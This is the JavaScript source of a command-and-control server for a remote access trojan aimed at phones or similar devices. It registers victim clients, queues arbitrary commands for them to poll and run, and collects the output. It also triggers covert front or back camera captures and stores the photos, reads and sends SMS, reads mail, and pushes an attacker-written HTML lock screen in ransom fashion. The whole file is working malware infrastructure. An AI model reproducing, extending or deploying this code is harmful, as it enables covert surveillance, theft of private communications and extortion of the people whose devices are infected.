import fs from 'fs';

// --- in-memory store ---
const store = {
  clients: new Map(),        // clientId -> { hostname, os, status, lastSeen, battery }
  commands: new Map(),       // clientId -> [{ id, command, params }]
  results: new Map(),        // clientId -> [{ commandId, output, error, timestamp }]
  photos: new Map(),         // clientId -> { front: base64, back: base64, timestamp }
  sms: new Map(),            // clientId -> [{ from, body, timestamp }]
  mails: new Map(),          // clientId -> [{ from, subject, body, timestamp }]
  lockScreens: new Map(),    // clientId -> { html, active }
  lcdEffects: new Map(),     // clientId -> { effect, active }
};

// --- persistence ---
const STORE_FILE = '/tmp/rat-store.json';
function loadStore() {
  try {
    if (fs.existsSync(STORE_FILE)) {
      const raw = fs.readFileSync(STORE_FILE, 'utf8');
      const data = JSON.parse(raw);
      store.clients = new Map(Object.entries(data.clients || {}));
      store.commands = new Map(Object.entries(data.commands || {}));
      store.results = new Map(Object.entries(data.results || {}));
      store.photos = new Map(Object.entries(data.photos || {}));
      store.sms = new Map(Object.entries(data.sms || {}));
      store.mails = new Map(Object.entries(data.mails || {}));
      store.lockScreens = new Map(Object.entries(data.lockScreens || {}));
      store.lcdEffects = new Map(Object.entries(data.lcdEffects || {}));
    }
  } catch (e) {}
}
function saveStore() {
  try {
    const data = {
      clients: Object.fromEntries(store.clients),
      commands: Object.fromEntries(store.commands),
      results: Object.fromEntries(store.results),
      photos: Object.fromEntries(store.photos),
      sms: Object.fromEntries(store.sms),
      mails: Object.fromEntries(store.mails),
      lockScreens: Object.fromEntries(store.lockScreens),
      lcdEffects: Object.fromEntries(store.lcdEffects),
    };
    fs.writeFileSync(STORE_FILE, JSON.stringify(data), 'utf8');
  } catch (e) {}
}
loadStore();

// --- helpers ---
function generateId() { return 'c' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6); }

function cleanupStale() {
  const now = Date.now();
  for (const [id, client] of store.clients) {
    if (now - (client.lastSeen || 0) > 60000) {
      client.status = 'offline';
      store.clients.set(id, client);
    }
  }
  saveStore();
}
setInterval(cleanupStale, 15000);

// --- MAIN HANDLER ---
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const { action } = req.query;

  try {
    switch (action) {
      // Core
      case 'clients': return getClients(req, res);
      case 'register': return registerClient(req, res);
      case 'heartbeat': return heartbeat(req, res);
      case 'poll': return pollCommands(req, res);
      case 'command': return sendCommand(req, res);
      case 'result': return postResult(req, res);
      case 'results': return getResults(req, res);

      // Flash
      case 'flash': return controlFlash(req, res);

      // Camera
      case 'camera': return triggerCamera(req, res);
      case 'photo': return getPhoto(req, res);

      // Lock Screen
      case 'lock': return setLockScreen(req, res);
      case 'unlock': return unlockScreen(req, res);

      // LCD Effect
      case 'lcd': return setLcdEffect(req, res);

      // SMS
      case 'sms': return getSms(req, res);
      case 'send_sms': return sendSms(req, res);

      // Mail
      case 'mail': return getMail(req, res);

      default:
        return res.status(400).json({ error: 'Invalid action' });
    }
  } catch (error) {
    console.error('[api]', error);
    return res.status(500).json({ error: 'Internal error' });
  }
}

// ===== ENDPOINTS =====

function getClients(req, res) {
  const list = [];
  for (const [id, data] of store.clients) {
    list.push({ id, ...data, battery: data.battery || 0 });
  }
  list.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
  return res.json(list);
}

function registerClient(req, res) {
  const { clientId, hostname, os, battery = 0 } = req.body || {};
  const id = clientId || generateId();
  store.clients.set(id, {
    hostname: hostname || 'unknown',
    os: os || 'unknown',
    status: 'online',
    lastSeen: Date.now(),
    battery: parseInt(battery) || 0,
  });
  if (!store.commands.has(id)) store.commands.set(id, []);
  if (!store.results.has(id)) store.results.set(id, []);
  if (!store.photos.has(id)) store.photos.set(id, { front: null, back: null });
  if (!store.sms.has(id)) store.sms.set(id, []);
  if (!store.mails.has(id)) store.mails.set(id, []);
  if (!store.lockScreens.has(id)) store.lockScreens.set(id, { html: null, active: false });
  if (!store.lcdEffects.has(id)) store.lcdEffects.set(id, { effect: null, active: false });
  saveStore();
  return res.json({ clientId: id, registered: true });
}

function heartbeat(req, res) {
  const { clientId, battery } = req.body || {};
  if (!clientId) return res.status(400).json({ error: 'clientId required' });
  if (!store.clients.has(clientId)) return res.status(404).json({ error: 'Not registered' });

  const client = store.clients.get(clientId);
  client.status = 'online';
  client.lastSeen = Date.now();
  if (battery !== undefined) client.battery = parseInt(battery);
  store.clients.set(clientId, client);
  saveStore();
  return res.json({ ok: true });
}

function pollCommands(req, res) {
  const { clientId, lastCommandId = 0 } = req.body || {};
  if (!clientId) return res.status(400).json({ error: 'clientId required' });

  const queue = store.commands.get(clientId) || [];
  const commands = queue.filter(cmd => cmd.id > parseInt(lastCommandId));

  // cleanup old >120s
  const now = Date.now();
  const keep = queue.filter(cmd => now - cmd.id < 120000);
  store.commands.set(clientId, keep);
  saveStore();
  return res.json({ commands });
}

function sendCommand(req, res) {
  const { clientId, command, params = {} } = req.body || {};
  if (!clientId || !command) return res.status(400).json({ error: 'clientId and command required' });
  if (!store.clients.has(clientId)) return res.status(404).json({ error: 'Client not found' });
  if (store.clients.get(clientId).status !== 'online') {
    return res.status(400).json({ error: 'Client offline' });
  }

  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command, params });
  store.commands.set(clientId, queue);
  saveStore();
  return res.json({ commandId: cmdId, status: 'queued' });
}

function postResult(req, res) {
  const { clientId, commandId, output, error = false } = req.body || {};
  if (!clientId || !commandId) return res.status(400).json({ error: 'clientId and commandId required' });

  const results = store.results.get(clientId) || [];
  results.push({ commandId: parseInt(commandId), output: output || '(empty)', error: !!error, timestamp: Date.now() });
  if (results.length > 100) results.splice(0, results.length - 100);
  store.results.set(clientId, results);
  saveStore();
  return res.json({ ok: true });
}

function getResults(req, res) {
  const { clientId, after = 0 } = req.query;
  if (!clientId) return res.status(400).json({ error: 'clientId required' });
  const results = store.results.get(clientId) || [];
  const filtered = results.filter(r => r.commandId > parseInt(after));
  filtered.sort((a, b) => a.commandId - b.commandId);
  return res.json(filtered);
}

// --- FLASH ---
function controlFlash(req, res) {
  const { clientId, action: flashAction } = req.body || {};
  if (!clientId || !flashAction) return res.status(400).json({ error: 'clientId and flash action required' });
  // Valid actions: on, off, blink
  if (!['on', 'off', 'blink'].includes(flashAction)) {
    return res.status(400).json({ error: 'Invalid flash action' });
  }
  // Queue command to client
  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'flash', params: { action: flashAction } });
  store.commands.set(clientId, queue);
  saveStore();
  return res.json({ commandId: cmdId, status: 'queued', flashAction });
}

// --- CAMERA ---
function triggerCamera(req, res) {
  const { clientId, camera = 'back' } = req.body || {};
  if (!clientId) return res.status(400).json({ error: 'clientId required' });
  if (!['front', 'back'].includes(camera)) return res.status(400).json({ error: 'camera must be front or back' });

  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'camera', params: { camera } });
  store.commands.set(clientId, queue);
  saveStore();
  return res.json({ commandId: cmdId, status: 'queued', camera });
}

function getPhoto(req, res) {
  const { clientId, camera = 'back' } = req.query;
  if (!clientId) return res.status(400).json({ error: 'clientId required' });
  const photos = store.photos.get(clientId) || {};
  const photo = camera === 'front' ? photos.front : photos.back;
  return res.json({ clientId, camera, photo: photo || null });
}

// Client posts photo via result with special type
// We handle in postResult via detection
// Override postResult to handle photo
const originalPostResult = postResult;
postResult = function(req, res) {
  const { clientId, commandId, output, error = false, type } = req.body || {};
  if (type === 'photo') {
    const { camera, data } = JSON.parse(output);
    const photos = store.photos.get(clientId) || { front: null, back: null };
    if (camera === 'front') photos.front = data;
    else if (camera === 'back') photos.back = data;
    store.photos.set(clientId, photos);
    saveStore();
    return res.json({ ok: true, photoStored: true });
  }
  return originalPostResult(req, res);
};

// --- LOCK SCREEN ---
function setLockScreen(req, res) {
  const { clientId, html } = req.body || {};
  if (!clientId || !html) return res.status(400).json({ error: 'clientId and html required' });
  store.lockScreens.set(clientId, { html, active: true });
  // Queue command to client to display lock screen
  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'lock_screen', params: { html } });
  store.commands.set(clientId, queue);
  saveStore();
  return res.json({ clientId, lockActive: true });
}

function unlockScreen(req, res) {
  const { clientId } = req.body || {};
  if (!clientId) return res.status(400).json({ error: 'clientId required' });
  store.lockScreens.set(clientId, { html: null, active: false });
  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'unlock_screen', params: {} });
  store.commands.set(clientId, queue);
  saveStore();
  return res.json({ clientId, lockActive: false });
}

// --- LCD EFFECT ---
function setLcdEffect(req, res) {
  const { clientId, effect } = req.body || {};
  if (!clientId || !effect) return res.status(400).json({ error: 'clientId and effect required' });
  store.lcdEffects.set(clientId, { effect, active: true });
  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'lcd_effect', params: { effect } });
  store.commands.set(clientId, queue);
  saveStore();
  return res.json({ clientId, lcdActive: true, effect });
}

// --- SMS ---
function getSms(req, res) {
  const { clientId } = req.query;
  if (!clientId) return res.status(400).json({ error: 'clientId required' });
  const smsList = store.sms.get(clientId) || [];
  return res.json({ clientId, sms: smsList });
}

function sendSms(req, res) {
  const { clientId, to, body } = req.body || {};
  if (!clientId || !to || !body) return res.status(400).json({ error: 'clientId, to, body required' });
  const cmdId = Date.now();
  const queue = store.commands.get(clientId) || [];
  queue.push({ id: cmdId, command: 'send_sms', params: { to, body } });
  store.commands.set(clientId, queue);
  saveStore();
  return res.json({ commandId: cmdId, status: 'queued' });
}

// --- MAIL ---
function getMail(req, res) {
  const { clientId } = req.query;
  if (!clientId) return res.status(400).json({ error: 'clientId required' });
  const mails = store.mails.get(clientId) || [];
  return res.json({ clientId, mails });
}
